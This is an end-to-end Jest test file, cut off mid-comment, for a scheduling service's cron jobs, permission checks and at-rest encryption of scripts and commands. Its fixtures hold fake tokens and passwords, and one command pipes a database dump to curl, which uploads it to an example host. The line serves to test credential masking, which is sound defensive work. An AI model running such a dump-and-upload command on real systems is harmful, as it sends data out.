import { ForbiddenException, NotFoundException } from '@nestjs/common';
import { SchedulingService } from '../../src/scheduling/scheduling.service';
import { eq, sql } from 'drizzle-orm';
import request from 'supertest';
import { App } from 'supertest/types';
import { z } from 'zod';
import { ApplicationsService } from '../../src/applications/applications.service';
import { cloudgateDirectoryOn } from '../../src/common/config/cloudgate-directory';
import { ComposeService } from '../../src/compose/compose.service';
import { EnvironmentsService } from '../../src/environments/environments.service';
import { ProjectsService } from '../../src/projects/projects.service';
import { PermissionCtx } from '../../src/rbac/permission.service';
import { RemoteExecService } from '../../src/remote/remote-exec.service';
import {
  createScheduleSchema,
  INERT_COMMAND_REFUSAL,
  INERT_SCRIPT_REFUSAL,
} from '../../src/scheduling/schedules/dto/schedule.dto';
import { schedule } from '../../src/scheduling/schedules/schedule.schema';
import { SchedulesService } from '../../src/scheduling/schedules/schedules.service';
import { ServersService } from '../../src/servers/servers.service';
import { SshKeysService } from '../../src/ssh-keys/ssh-keys.service';
import { freezeOrganization } from '../utils/frozen-organization';
import { createTestApp, TestAppContext } from '../utils/test-app';
import {
  secondOrganizationOwner,
  createOrganization,
} from '../utils/test-auth';

jest.setTimeout(120_000);

// SchedulesService CRUD: user-defined cron jobs against an application/compose
// container, a remote server, or the cloudgate host itself.
// server/cloudgate-server schedules materialize their script.sh at
// create/update and are owner/admin-only; application/compose schedules are
// row-access-scoped like every other service-attached resource.

/**
 * The platform host's root — this process's CLOUDGATE_DIRECTORY — for every
 * assertion here about work that runs on it: an application or compose
 * schedule whose Service has no `serverId`, and every `cloudgate-server` one
 * (ADR-0008). Asked of the machine rather than spelled; the literal
 * `/etc/cloudgate` those assertions used to name is a Server's root, and it
 * stays spelled out below wherever the command went to one.
 */
const platformHostRoot = () => cloudgateDirectoryOn(null);

/** `PermissionService.checkInstanceAuthority`'s refusal, written out. */
const INSTANCE_AUTHORITY_REFUSAL =
  'Only an owner or admin of the instance organization can configure the platform host';

const owner = {
  name: 'Grace Hopper',
  email: 'grace@example.com',
  password: 'super-secret-password',
};

async function signUp(
  server: App,
  body: { name: string; email: string; password: string },
): Promise<{ cookie: string; id: string }> {
  const res = await request(server).post('/api/auth/sign-up/email').send(body);
  expect(res.status).toBe(200);
  const { user } = res.body as { user: { id: string } };
  return { cookie: res.headers['set-cookie'], id: user.id };
}

const permissionCtx = (userId: string, organizationId: string) => ({
  user: { id: userId },
  session: { activeOrganizationId: organizationId },
});

/** Invites a user into the owner's organization and accepts as them. */
async function inviteUser(
  server: App,
  ownerCookie: string,
  email: string,
  role: 'admin' | 'member',
): Promise<{ cookie: string; id: string }> {
  const invite = await request(server)
    .post('/organizations/invitations')
    .set('Cookie', ownerCookie)
    .send({ email, role });
  const inviteId = (invite.body as { id: string }).id;

  const su = await request(server)
    .post('/api/auth/sign-up/email')
    .set('x-cloudgate-token', inviteId)
    .send({ name: 'Ida Rhodes', email, password: 'super-secret-password' });
  const cookie = su.headers['set-cookie'];
  const id = (su.body as { user: { id: string } }).user.id;

  const accept = await request(server)
    .post(`/organizations/invitations/${inviteId}/accept`)
    .set('Cookie', cookie);
  expect(accept.status).toBe(201);

  return { cookie, id };
}

/** The script.sh content a materialization command writes (base64 payload). */
function decodeMaterializedScript(command: string): string {
  const match = command.match(/echo "([A-Za-z0-9+/=]+)" \| base64 -d/);
  expect(match).not.toBeNull();
  return Buffer.from(match![1], 'base64').toString('utf8');
}

describe('Schedules (e2e)', () => {
  let ctx: TestAppContext;
  let server: App;
  let projects: ProjectsService;
  let environments: EnvironmentsService;
  let applications: ApplicationsService;
  let compose: ComposeService;
  let servers: ServersService;
  let sshKeys: SshKeysService;
  let schedules: SchedulesService;
  let scheduling: SchedulingService;

  /**
   * Creates a schedule from a request-shaped fixture. `shellType` and
   * `scheduleType` carry zod `.default()`s, so they are optional on the
   * schema's *input* and required on its output — and `CreateScheduleDto` is
   * typed from the output. Fixtures that omit one stand in for an HTTP caller
   * that omits it, so they are typed from the input and put through the schema
   * here, exactly as the ZodValidationPipe does before a request body reaches
   * the service.
   *
   * `command` was a third such field until the fix and is now plain
   * `.optional()` — absent means absent, and the `''` a host schedule's
   * `notNull` column holds is minted in `SchedulesService.create` instead. The
   * fixtures below that spell `command: ''` out for a `server` schedule
   * therefore stand in for a client that sends it, which the refusal admits
   * deliberately; omitting it entirely would be just as legal.
   */
  const createSchedule = (
    permCtx: PermissionCtx,
    data: z.input<typeof createScheduleSchema>,
  ) => schedules.create(permCtx, createScheduleSchema.parse(data));

  const execMock = {
    execAsync: jest.fn(),
    execAsyncRemote: jest.fn(),
  };

  beforeAll(async () => {
    ctx = await createTestApp({
      overrideProviders: [{ provide: RemoteExecService, useValue: execMock }],
    });
    server = ctx.app.getHttpServer() as App;
    scheduling = ctx.app.get(SchedulingService);
    projects = ctx.app.get(ProjectsService);
    environments = ctx.app.get(EnvironmentsService);
    applications = ctx.app.get(ApplicationsService);
    compose = ctx.app.get(ComposeService);
    servers = ctx.app.get(ServersService);
    sshKeys = ctx.app.get(SshKeysService);
    schedules = ctx.app.get(SchedulesService);
  });

  afterAll(async () => {
    await ctx.teardown();
  });

  beforeEach(async () => {
    await ctx.resetDb();
    // Jobs registered by a previous test would leak across resets.
    for (const id of scheduling.ids()) {
      scheduling.unregister(id);
    }
    execMock.execAsync
      .mockReset()
      .mockResolvedValue({ stdout: '', stderr: '', exitCode: 0 });
    execMock.execAsyncRemote
      .mockReset()
      .mockResolvedValue({ stdout: '', stderr: '', exitCode: 0 });
  });

  /** An owner ctx plus an application to attach schedules to. */
  async function setUpApplication() {
    const ownerSession = await signUp(server, owner);
    const orgs = await request(server)
      .get('/organizations')
      .set('Cookie', ownerSession.cookie);
    const organizationId = (orgs.body as { id: string }[])[0].id;
    const ownerCtx = permissionCtx(ownerSession.id, organizationId);

    const project = await projects.create(ownerCtx, { name: 'cloudgate' });
    const environment = await environments.create(ownerCtx, {
      name: 'production',
      projectId: project.projectId,
    });
    const application = await applications.create(ownerCtx, {
      name: 'Blog',
      appName: 'main-app',
      environmentId: environment.environmentId,
    });
    return {
      organizationId,
      ownerSession,
      ownerCtx,
      environment,
      application,
    };
  }

  const scheduleInput = (application: {
    applicationId: string;
  }): z.input<typeof createScheduleSchema> => ({
    name: 'Clear cache',
    cronExpression: '0 3 * * *',
    scheduleType: 'application' as const,
    serviceId: application.applicationId,
    command: 'rm -rf /tmp/cache',
  });

  describe('CRUD', () => {
    it('creates, reads, lists, updates and removes an application schedule', async () => {
      const { ownerCtx, application } = await setUpApplication();

      const created = await createSchedule(
        ownerCtx,
        scheduleInput(application),
      );
      expect(created.scheduleId).toEqual(expect.any(String));
      expect(created.applicationId).toBe(application.applicationId);
      expect(created.appName).toMatch(/^schedule-/);
      // The defaults: shellType/scheduleType from the create schema,
      // enabled from the column.
      expect(created.shellType).toBe('bash');
      expect(created.scheduleType).toBe('application');
      expect(created.enabled).toBe(true);

      const found = await schedules.findOne(ownerCtx, created.scheduleId);
      expect(found).toMatchObject({
        scheduleId: created.scheduleId,
        name: 'Clear cache',
        cronExpression: '0 3 * * *',
        command: 'rm -rf /tmp/cache',
      });

      const listed = await schedules.list(ownerCtx, {
        scheduleType: 'application',
        serviceId: application.applicationId,
      });
      expect(listed).toHaveLength(1);
      expect(listed[0].scheduleId).toBe(created.scheduleId);

      const updated = await schedules.update(ownerCtx, created.scheduleId, {
        cronExpression: '30 4 * * *',
        command: 'rm -rf /tmp/other-cache',
        shellType: 'sh',
      });
      expect(updated).toMatchObject({
        scheduleId: created.scheduleId,
        cronExpression: '30 4 * * *',
        command: 'rm -rf /tmp/other-cache',
        shellType: 'sh',
      });

      await schedules.remove(ownerCtx, created.scheduleId);
      await expect(
        schedules.findOne(ownerCtx, created.scheduleId),
      ).rejects.toThrow(NotFoundException);

      // Deleting a schedule drops its script directory even for container
      // schedules (application has no server → local exec).
      const rmCall = execMock.execAsync.mock.calls.find(([command]) =>
        (command as string).includes('rm -rf'),
      ) as [string];
      expect(rmCall[0]).toBe(
        `rm -rf ${platformHostRoot()}/schedules/${created.appName}`,
      );
    });

    it('creates a compose schedule against the stack service', async () => {
      const { ownerCtx, environment } = await setUpApplication();
      const stack = await compose.create(ownerCtx, {
        name: 'Shop Stack',
        appName: 'shop-stack',
        environmentId: environment.environmentId,
      });

      const created = await createSchedule(ownerCtx, {
        name: 'Prune stack tmp',
        cronExpression: '0 3 * * *',
        scheduleType: 'compose',
        serviceId: stack.composeId,
        serviceName: 'web',
        command: 'rm -rf /tmp/cache',
      });
      expect(created.composeId).toBe(stack.composeId);
      expect(created.serviceName).toBe('web');

      const listed = await schedules.list(ownerCtx, {
        scheduleType: 'compose',
        serviceId: stack.composeId,
      });
      expect(listed.map((row) => row.scheduleId)).toEqual([created.scheduleId]);
    });

    it('rejects a service from another organization', async () => {
      const { ownerSession, application } = await setUpApplication();
      const secondOrg = await createOrganization(
        server,
        ctx.db,
        ownerSession.cookie,
        { name: 'Second Org' },
      );
      const secondOrgCtx = permissionCtx(
        ownerSession.id,
        (secondOrg.body as { id: string }).id,
      );

      await expect(
        createSchedule(secondOrgCtx, scheduleInput(application)),
      ).rejects.toThrow(NotFoundException);
    });
  });

  describe('server schedules', () => {
    async function setUpServer() {
      const context = await setUpApplication();
      const key = await sshKeys.create(context.ownerCtx, {
        name: 'server-key',
      });
      const remote = await servers.create(context.ownerCtx, {
        name: 'worker-1',
        ipAddress: '203.0.113.10',
        port: 22,
        username: 'root',
        sshKeyId: key.sshKeyId,
      });
      return { ...context, remote };
    }

    it('materializes script.sh on the remote server at create and update', async () => {
      const { ownerCtx, remote } = await setUpServer();

      const created = await createSchedule(ownerCtx, {
        name: 'Update packages',
        cronExpression: '0 6 * * *',
        scheduleType: 'server',
        serviceId: remote.serverId,
        command: '',
        script: 'apt update',
      });
      expect(created.serverId).toBe(remote.serverId);

      // The script lands base64-encoded in
      // `{schedulesDirectoryOn(serverId)}/{appName}/script.sh` on the
      // schedule's server, with the PID/Schedule ID echo header prepended.
      const [serverId, command] = execMock.execAsyncRemote.mock.calls[0] as [
        string,
        string,
      ];
      expect(serverId).toBe(remote.serverId);
      expect(command).toContain(
        `mkdir -p /etc/cloudgate/schedules/${created.appName}`,
      );
      // The script is written beside its destination and moved
      // onto it, so a write that dies half-way cannot leave script.sh gone.
      expect(command).toContain(
        `chmod +x /etc/cloudgate/schedules/${created.appName}/script.sh.tmp`,
      );
      expect(command).toContain(
        `mv -f /etc/cloudgate/schedules/${created.appName}/script.sh.tmp ` +
          `/etc/cloudgate/schedules/${created.appName}/script.sh`,
      );
      expect(decodeMaterializedScript(command)).toBe(
        `echo "PID: $$ | Schedule ID: ${created.scheduleId}"\napt update`,
      );

      execMock.execAsyncRemote.mockClear();
      await schedules.update(ownerCtx, created.scheduleId, {
        script: 'apt update && apt upgrade -y',
      });
      const [, updateCommand] = execMock.execAsyncRemote.mock.calls[0] as [
        string,
        string,
      ];
      expect(decodeMaterializedScript(updateCommand)).toBe(
        `echo "PID: $$ | Schedule ID: ${created.scheduleId}"\napt update && apt upgrade -y`,
      );
    });

    it('removes the script directory on the remote server at delete', async () => {
      const { ownerCtx, remote } = await setUpServer();
      const created = await createSchedule(ownerCtx, {
        name: 'Update packages',
        cronExpression: '0 6 * * *',
        scheduleType: 'server',
        serviceId: remote.serverId,
        command: '',
        script: 'apt update',
      });

      execMock.execAsyncRemote.mockClear();
      await schedules.remove(ownerCtx, created.scheduleId);

      const [serverId, command] = execMock.execAsyncRemote.mock.calls[0] as [
        string,
        string,
      ];
      expect(serverId).toBe(remote.serverId);
      expect(command).toBe(
        `rm -rf /etc/cloudgate/schedules/${created.appName}`,
      );
    });

    it('only owners and admins manage server schedules', async () => {
      const { organizationId, ownerSession, remote } = await setUpServer();
      const member = await inviteUser(
        server,
        ownerSession.cookie,
        'ida@example.com',
        'member',
      );
      const memberCtx = permissionCtx(member.id, organizationId);

      await expect(
        createSchedule(memberCtx, {
          name: 'Update packages',
          cronExpression: '0 6 * * *',
          scheduleType: 'server',
          serviceId: remote.serverId,
          command: '',
          script: 'apt update',
        }),
      ).rejects.toThrow(ForbiddenException);

      const admin = await inviteUser(
        server,
        ownerSession.cookie,
        'ada@example.com',
        'admin',
      );
      const adminCtx = permissionCtx(admin.id, organizationId);
      const created = await createSchedule(adminCtx, {
        name: 'Update packages',
        cronExpression: '0 6 * * *',
        scheduleType: 'server',
        serviceId: remote.serverId,
        command: '',
        script: 'apt update',
      });
      expect(created.serverId).toBe(remote.serverId);
    });

    it('rejects a server from another organization', async () => {
      const { ownerSession, remote } = await setUpServer();
      const secondOrg = await createOrganization(
        server,
        ctx.db,
        ownerSession.cookie,
        { name: 'Second Org' },
      );
      const secondOrgCtx = permissionCtx(
        ownerSession.id,
        (secondOrg.body as { id: string }).id,
      );

      await expect(
        createSchedule(secondOrgCtx, {
          name: 'Update packages',
          cronExpression: '0 6 * * *',
          scheduleType: 'server',
          serviceId: remote.serverId,
          command: '',
          script: 'apt update',
        }),
      ).rejects.toThrow(NotFoundException);
    });

    /**
     * `script` is an `encryptedText` column, and none of the four things
     * that read it may notice.
     *
     * The column holds a shell script an operator authors, which Cloudgate
     * writes to `script.sh` on a Server and runs there on a cron — `mount.content`
     * and `patch.content` were made `encryptedText` on the argument that a file
     * body is where an operator puts a credential, and this is that argument
     * with a shebang. Nothing in the tree queries the column by value (the one
     * thing AES-GCM under a random IV would break, and the reason better-auth's
     * `session.token` is exempt from the at-rest sweep), so the whole risk of the
     * change is in the readers, and the readers are here: the author's own
     * round trip, the materialization, the cron-fired run, and a row written
     * before the column had a type (ADR 0006's pass-through, ADR 0015).
     */
    describe('the script at rest', () => {
      /**
       * A script whose bytes are the point. Two credentials of the shape the
       * ticket names, and then every byte that a base64 round trip, a shell
       * quote or a JSON body could plausibly eat: both quote characters, a
       * backslash, a literal `$`, a tab, and a trailing newline.
       *
       * Written out here rather than derived, so the expectation cannot be
       * recomputed the way the column computes it (§1.7).
       */
      const CREDENTIAL_SCRIPT = [
        '#!/usr/bin/env bash',
        'PGPASSWORD="p@ss w\'rd\\$$" pg_dump cloudgate > /tmp/dump.sql',
        'curl -H "Authorization: Bearer sk-live-9f3ad2" https://api.example.com',
        "\techo 'done'",
        '',
      ].join('\n');

      /** The `script` column exactly as Postgres holds it, driver-side. */
      async function scriptAtRest(scheduleId: string): Promise<string> {
        const raw = await ctx.db.execute(
          sql`SELECT script FROM schedule WHERE schedule_id = ${scheduleId}`,
        );
        return (raw.rows[0] as { script: string }).script;
      }

      it('returns a script to its author byte-identical over ciphertext at rest', async () => {
        const { ownerSession, remote } = await setUpServer();

        const created = await request(server)
          .post('/schedules')
          .set('Cookie', ownerSession.cookie)
          .send({
            name: 'Nightly dump',
            cronExpression: '0 6 * * *',
            scheduleType: 'server',
            serviceId: remote.serverId,
            command: '',
            script: CREDENTIAL_SCRIPT,
          });
        expect(created.status).toBe(201);
        const { scheduleId } = created.body as { scheduleId: string };

        // The create response, the single read and the listing are three
        // different queries over the column and all three are the operator who
        // wrote it — an author reading their own script back is the one echo
        // this classification does not forbid.
        expect((created.body as { script: string }).script).toBe(
          CREDENTIAL_SCRIPT,
        );

        const found = await request(server)
          .get(`/schedules/${scheduleId}`)
          .set('Cookie', ownerSession.cookie);
        expect(found.status).toBe(200);
        expect((found.body as { script: string }).script).toBe(
          CREDENTIAL_SCRIPT,
        );

        const listed = await request(server)
          .get('/schedules')
          .query({ scheduleType: 'server', serviceId: remote.serverId })
          .set('Cookie', ownerSession.cookie);
        expect(listed.status).toBe(200);
        expect((listed.body as { script: string }[])[0].script).toBe(
          CREDENTIAL_SCRIPT,
        );

        // And what a `pg_dump` or a read replica hands its reader.
        const stored = await scriptAtRest(scheduleId);
        expect(stored.startsWith('enc:v1:')).toBe(true);
        expect(stored).not.toContain('sk-live-9f3ad2');
        expect(stored).not.toContain('PGPASSWORD');
      });

      it('materializes the decrypted script verbatim at create and update', async () => {
        const { ownerCtx, remote } = await setUpServer();

        const created = await createSchedule(ownerCtx, {
          name: 'Nightly dump',
          cronExpression: '0 6 * * *',
          scheduleType: 'server',
          serviceId: remote.serverId,
          command: '',
          script: CREDENTIAL_SCRIPT,
        });

        // The host has to receive plaintext — it is what runs. Encrypting the
        // column and then shipping `enc:v1:…` to `base64 -d` would be a broken
        // schedule that nothing else in this file would notice, because every
        // other assertion here matches on the path and not the payload.
        const [, command] = execMock.execAsyncRemote.mock.calls[0] as [
          string,
          string,
        ];
        expect(decodeMaterializedScript(command)).toBe(
          `echo "PID: $$ | Schedule ID: ${created.scheduleId}"\n${CREDENTIAL_SCRIPT}`,
        );

        // `update` materializes the row it is *about* to write, so it
        // reads the merged value rather than the column — and the half it
        // takes from the stored row has been through the driver both ways.
        execMock.execAsyncRemote.mockClear();
        await schedules.update(ownerCtx, created.scheduleId, {
          name: 'Nightly dump, renamed',
        });
        const [, renameCommand] = execMock.execAsyncRemote.mock.calls[0] as [
          string,
          string,
        ];
        expect(decodeMaterializedScript(renameCommand)).toBe(
          `echo "PID: $$ | Schedule ID: ${created.scheduleId}"\n${CREDENTIAL_SCRIPT}`,
        );
      });

      it('runs a cron-fired schedule whose script is encrypted', async () => {
        const { ownerCtx, remote } = await setUpServer();
        const created = await createSchedule(ownerCtx, {
          name: 'Nightly dump',
          cronExpression: '0 6 * * *',
          scheduleType: 'server',
          serviceId: remote.serverId,
          command: '',
          script: CREDENTIAL_SCRIPT,
        });

        // The two entry points a cron reaches, and neither has a session.
        // `initializeJobs` is the boot path: it selects *every* enabled row,
        // so it decrypts every `script` in the table before a single job is
        // registered — ADR 0006 makes a decryption failure throw rather than
        // fail open, and this is the one read where that would cost an
        // install its whole schedule set rather than one row.
        expect(scheduling.has(created.scheduleId)).toBe(true);
        scheduling.unregister(created.scheduleId);
        await schedules.initializeJobs();
        expect(scheduling.has(created.scheduleId)).toBe(true);

        // And the registered callback itself, which is `runScheduled` by row
        // id — awaited here rather than fired through SchedulingService so the run
        // has finished when the assertions read the mock.
        execMock.execAsyncRemote.mockClear();
        await schedules.runScheduled(created.scheduleId);

        // A cron run resolves its target with no session and reads the whole
        // row to do it, so a column the scheduled path could not decrypt would
        // fail here and nowhere else. The run itself executes the file on
        // disk — the script's own bytes reach no command and no log.
        const commands = execMock.execAsyncRemote.mock.calls.map(
          (call) => (call as [string, string])[1],
        );
        expect(commands.join('\n')).toContain(
          `bash -c /etc/cloudgate/schedules/${created.appName}/script.sh`,
        );
        expect(commands.join('\n')).not.toContain('sk-live-9f3ad2');
      });

      it('runs nothing on the Server for a cron-fired schedule of a Frozen Organization', async () => {
        const { organizationId, ownerCtx, remote } = await setUpServer();
        const created = await createSchedule(ownerCtx, {
          name: 'Nightly dump',
          cronExpression: '0 6 * * *',
          scheduleType: 'server',
          serviceId: remote.serverId,
          command: '',
          script: CREDENTIAL_SCRIPT,
        });
        await freezeOrganization(ctx, organizationId);
        execMock.execAsyncRemote.mockClear();

        await scheduling.runNow(created.scheduleId);

        expect(execMock.execAsyncRemote).not.toHaveBeenCalled();
        const runs = await ctx.db.execute(
          sql`SELECT status FROM deployment WHERE schedule_id = ${created.scheduleId}`,
        );
        expect(runs.rows).toEqual([]);
        jest.restoreAllMocks();
      });

      it('reads and re-encrypts a script written before the column had a type', async () => {
        const { ownerCtx, remote } = await setUpServer();
        // A row as an install that predates this change holds it: plaintext,
        // no `enc:v1:` prefix. Written with raw SQL because the point is to
        // get past the driver that would otherwise encrypt it.
        const scheduleId = 'legacy-schedule-id';
        await ctx.db.execute(sql`
          INSERT INTO schedule (
            schedule_id, name, cron_expression, app_name, shell_type,
            schedule_type, command, script, server_id, enabled, created_at
          ) VALUES (
            ${scheduleId}, 'Legacy dump', '0 6 * * *', 'schedule-legacy',
            'bash', 'server', '', ${CREDENTIAL_SCRIPT}, ${remote.serverId},
            true, ${new Date().toISOString()}
          )
        `);
        expect(await scriptAtRest(scheduleId)).toBe(CREDENTIAL_SCRIPT);

        // ADR 0006: a value without the prefix is passed through on read, so
        // the row keeps working rather than throwing or answering ciphertext.
        const found = await schedules.findOne(ownerCtx, scheduleId);
        expect(found.script).toBe(CREDENTIAL_SCRIPT);

        // A rename writes every column but this one, so the plaintext stays —
        // and the script it puts on the host is still the operator's.
        execMock.execAsyncRemote.mockClear();
        await schedules.update(ownerCtx, scheduleId, { name: 'Renamed' });
        expect(await scriptAtRest(scheduleId)).toBe(CREDENTIAL_SCRIPT);
        const [, renameCommand] = execMock.execAsyncRemote.mock.calls[0] as [
          string,
          string,
        ];
        expect(decodeMaterializedScript(renameCommand)).toBe(
          `echo "PID: $$ | Schedule ID: ${scheduleId}"\n${CREDENTIAL_SCRIPT}`,
        );

        // Writing the column is what re-encrypts it — "on their next write",
        // and no backfill.
        const edited = `${CREDENTIAL_SCRIPT}echo "and one more line"\n`;
        await schedules.update(ownerCtx, scheduleId, { script: edited });
        expect((await scriptAtRest(scheduleId)).startsWith('enc:v1:')).toBe(
          true,
        );
        expect((await schedules.findOne(ownerCtx, scheduleId)).script).toBe(
          edited,
        );
      });
    });

    /**
     * `command` is an `encryptedText` column, **and the echo went
     * first**.
     *
     * An earlier fix left it plain deliberately, and the reason was the point: ADR 0015's
     * rule is about a file body, and encrypting a column the code then prints
     * is exactly the docblock lie that ticket warns against. The echo turned
     * out to be *two* echoes with two different audiences, and only one of them
     * was a problem.
     *
     * - **The deployment log** — `buildScheduleCommandScript`'s
     *   `echo "Running command: …"` — keeps the command verbatim, and stays.
     *   `DeploymentsService.resolveLogServer` reaches a schedule run's log
     *   through `scheduleRunServer`, which calls `SchedulesService.findOne`:
     *   `checkRowAccess(ctx, row, 'read')`, the identical predicate that
     *   answers `GET /schedules/:id` with the column in clear. The log reader
     *   *is* the column reader, and the file sits on the host that is about to
     *   run the command anyway — the far end ADR 0006 does not claim to defend,
     *   the same far end that makes "the script lands as `script.sh` in clear"
     *   not an argument against encrypting `script`. It is load-bearing too: it
     *   is how an operator sees what last night's failed run ran, which the row
     *   cannot answer once the command has been edited.
     * - **Cloudgate's own journal** was the real one, and it is closed
     *   structurally rather than masked. The command was a word of the program
     *   handed to `RemoteExecService`, so `ExecError` captured it and pino wrote
     *   it six times over — and every failed run reached that path, because the
     *   script turns the operator's own non-zero exit into a failed exec. It
     *   now travels in `RemoteExecOptions.env` / `ExecOptions.env` under
     *   `CG_SCHEDULE_COMMAND` (ADR 0015's mask-is-second-choice bullet, the never-carry
     *   shape), so there is nothing in the program to elide.
     *
     * A shape-preserving elision was considered and is **not implementable**,
     * which is the other half of the ticket's question. The error mask's model works
     * because Cloudgate authors the wire shape it recognises; a container-exec
     * command has no Cloudgate-authored *internal* grammar, and every candidate
     * token class demonstrably can be the secret — the first word
     * (`PGPASSWORD=… pg_dump`), a flag's value (`curl -H "Authorization: …"`),
     * and the flag token itself (`mysql -phunter2`, the documented form). A
     * rule keeping "every verb, path and flag" leaks the third outright. So the
     * only implementable elisions here are all-or-nothing, and never-carry is
     * strictly better than any of them.
     */
    describe('the command at rest', () => {
      /**
       * A container command whose bytes are the point: the two credential
       * shapes the ticket names, both quote characters, a backslash, a literal
       * `$` and a `|` — a command is a shell program, so the characters a
       * transport could eat are the ones it is made of.
       *
       * Written out here rather than derived, so the expectation cannot be
       * recomputed the way the column computes it (§1.7).
       */
      const CREDENTIAL_COMMAND =
        `PGPASSWORD="p@ss w'rd\\$$" pg_dump cloudgate | ` +
        `curl -H "Authorization: Bearer sk-live-9f3ad2" -T - https://api.example.com`;

      /** The `command` column exactly as Postgres holds it, driver-side. */
      async function commandAtRest(scheduleId: string): Promise<string> {
        const raw = await ctx.db.execute(
          sql`SELECT command FROM schedule WHERE schedule_id = ${scheduleId}`,
        );
        return (raw.rows[0] as { command: string }).command;
      }

      it('returns a command to its author byte-identical over ciphertext at rest', async () => {
        const { ownerSession, application } = await setUpApplication();

        const created = await request(server)
          .post('/schedules')
          .set('Cookie', ownerSession.cookie)
          .send({
            name: 'Nightly dump',
            cronExpression: '0 6 * * *',
            scheduleType: 'application',
            serviceId: application.applicationId,
            command: CREDENTIAL_COMMAND,
          });
        expect(created.status).toBe(201);
        const { scheduleId } = created.body as { scheduleId: string };
        expect((created.body as { command: string }).command).toBe(
          CREDENTIAL_COMMAND,
        );

        const found = await request(server)
          .get(`/schedules/${scheduleId}`)
          .set('Cookie', ownerSession.cookie);
        expect(found.status).toBe(200);
        expect((found.body as { command: string }).command).toBe(
          CREDENTIAL_COMMAND,
        );

        const listed = await request(server)
          .get('/schedules')
          .query({
            scheduleType: 'application',
            serviceId: application.applicationId,
          })
          .set('Cookie', ownerSession.cookie);
        expect(listed.status).toBe(200);
        expect((listed.body as { command: string }[])[0].command).toBe(
          CREDENTIAL_COMMAND,
        );

        const stored = await commandAtRest(scheduleId);
        expect(stored.startsWith('enc:v1:')).toBe(true);
        expect(stored).not.toContain('sk-live-9f3ad2');
        expect(stored).not.toContain('PGPASSWORD');
      });

      it('hands the host plaintext in the environment and nothing in the program', async () => {
        const { ownerCtx, application } = await setUpApplication();
        const created = await createSchedule(ownerCtx, {
          ...scheduleInput(application),
          command: CREDENTIAL_COMMAND,
        });
        execMock.execAsync.mockClear();

        await schedules.runManual(ownerCtx, created.scheduleId);

        // The host has to receive plaintext — it is what runs. Encrypting the
        // column and then handing `enc:v1:…` to `docker exec` would be a
        // broken schedule that nothing else in this file would notice, because
        // every other assertion here matches on the path or the verb rather
        // than on the payload.
        const [program, options] = execMock.execAsync.mock.calls[1] as [
          string,
          { env: Record<string, string> },
        ];
        expect(options.env.CG_SCHEDULE_COMMAND).toBe(CREDENTIAL_COMMAND);

        // And the journal echo, which is the whole reason the echo came first:
        // `ExecError` captures the program, so the program is where a failed
        // run's credential used to be.
        expect(program).not.toContain('sk-live-9f3ad2');
        expect(program).not.toContain('PGPASSWORD');
        expect(program).not.toContain('enc:v1:');
        expect(
          program.includes(Buffer.from(CREDENTIAL_COMMAND).toString('base64')),
        ).toBe(false);
      });

      it('reads and re-encrypts a command written before the column had a type', async () => {
        const { ownerCtx, application } = await setUpApplication();
        const created = await createSchedule(
          ownerCtx,
          scheduleInput(application),
        );

        // A row as an install that predates this change holds it: plaintext, no
        // `enc:v1:` prefix. Written with raw SQL because the point is to get
        // past the driver that would otherwise encrypt it.
        await ctx.db.execute(
          sql`UPDATE schedule SET command = ${CREDENTIAL_COMMAND} WHERE schedule_id = ${created.scheduleId}`,
        );
        expect(await commandAtRest(created.scheduleId)).toBe(
          CREDENTIAL_COMMAND,
        );

        // ADR 0006: a value without the prefix is passed through on read, so
        // the row keeps running rather than throwing or answering ciphertext.
        expect(
          (await schedules.findOne(ownerCtx, created.scheduleId)).command,
        ).toBe(CREDENTIAL_COMMAND);

        // A rename writes every column but this one, so the plaintext stays.
        await schedules.update(ownerCtx, created.scheduleId, {
          name: 'Renamed',
        });
        expect(await commandAtRest(created.scheduleId)).toBe(
          CREDENTIAL_COMMAND,
        );

        // Writing the column is what re-encrypts it — "on their next write",
        // and no backfill.
        await schedules.update(ownerCtx, created.scheduleId, {
          command: `${CREDENTIAL_COMMAND} --verbose`,
        });
        expect(
          (await commandAtRest(created.scheduleId)).startsWith('enc:v1:'),
        ).toBe(true);
        expect(
          (await schedules.findOne(ownerCtx, created.scheduleId)).command,
        ).toBe(`${CREDENTIAL_COMMAND} --verbose`);
      });

      it('stores an empty command as itself rather than as ciphertext', async () => {
        // `command` is `notNull` with no default and a script schedule has
        // nothing to put in it, so every `server` row holds `''` — and
        // `encryptValue` short-circuits a falsy value, so the column never
        // holds an undecryptable ciphertext-of-empty. This is the half of the
        // classification that `notNull` makes worth asserting rather than
        // assuming.
        const { ownerCtx } = await setUpApplication();
        const key = await sshKeys.create(ownerCtx, { name: 'server-key' });
        const remote = await servers.create(ownerCtx, {
          name: 'worker-1',
          ipAddress: '203.0.113.10',
          port: 22,
          username: 'root',
          sshKeyId: key.sshKeyId,
        });
        const created = await createSchedule(ownerCtx, {
          name: 'Update packages',
          cronExpression: '0 6 * * *',
          scheduleType: 'server',
          serviceId: remote.serverId,
          command: '',
          script: 'apt update',
        });

        expect(await commandAtRest(created.scheduleId)).toBe('');
        expect(
          (await schedules.findOne(ownerCtx, created.scheduleId)).command,
        ).toBe('');
      });
    });
  });

  /**
   * Over HTTP and over the two paths a `script` can reach the
   * column by.
   *
   * `materializeScript` returns early for `application` and `compose`, so a
   * container schedule used to accept a script body, persist it — encrypted
   * — and never write it anywhere. The DTO's unit half is
   * `schedule-inert-script.spec.ts`, including the measured reasons the refusal
   * is a refinement rather than the parent change's discriminated union; what is
   * pinned here is the HTTP status, and the half no schema can state: `PATCH` carries no
   * `scheduleType`, so the rule has to be asked of the *row*.
   */
  describe('a script a schedule type cannot run', () => {
    it('refuses it on create, naming the field and the remedy', async () => {
      const { ownerSession, application } = await setUpApplication();

      const refused = await request(server)
        .post('/schedules')
        .set('Cookie', ownerSession.cookie)
        .send({
          name: 'Clear cache',
          cronExpression: '0 3 * * *',
          scheduleType: 'application',
          serviceId: application.applicationId,
          command: 'rm -rf /tmp/cache',
          script: 'PGPASSWORD=hunter2 pg_dump cloudgate',
        });

      expect(refused.status).toBe(400);
      expect(JSON.stringify(refused.body)).toContain(INERT_SCRIPT_REFUSAL);

      // And nothing was written: the refusal is at the DTO, in front of the
      // insert, so there is no row holding a script nothing will run.
      const rows = await ctx.db.execute(sql`SELECT count(*) FROM schedule`);
      expect((rows.rows[0] as { count: string }).count).toBe('0');
    });

    it('refuses it on update against the stored type, which the body cannot name', async () => {
      // `updateScheduleSchema` carries no `scheduleType` — a schedule cannot be
      // re-pointed — so this is the one branch the DTO structurally cannot
      // decide, and the reason `SchedulesService.refuseInertScript` exists. Left
